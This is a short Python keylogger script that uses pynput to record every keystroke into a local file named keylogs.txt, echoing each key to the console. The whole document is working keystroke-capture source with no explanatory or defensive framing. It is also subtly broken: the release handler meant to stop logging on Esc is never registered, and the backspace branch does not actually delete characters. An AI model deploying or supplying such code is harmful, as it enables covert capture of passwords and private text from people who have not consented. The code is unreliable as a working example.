import sys
from pynput import keyboard
import os

filename = "keylogs.txt"
file = open(filename, "w")

def onPress(key):

    print(str(key))

    stroke = str(key).replace("'", '')

    if str(key) == "Key.space":

        file.write(" ")

    elif str(key) == "Key.enter":

        file.write("\n")

    elif str(key) == "Key.esc":

        file.write(" ")

    elif str(key) == "Key.backspace":

        file.seek(file.tell() - 1, os.SEEK_SET)

        file.write("")
    else:
        file.write(stroke)

def onRelease(key):

    if str(key) == 'Key.esc':

        file.close()

        sys.exit(0)


with keyboard.Listener(on_press=onPress) as listener:
    listener.join()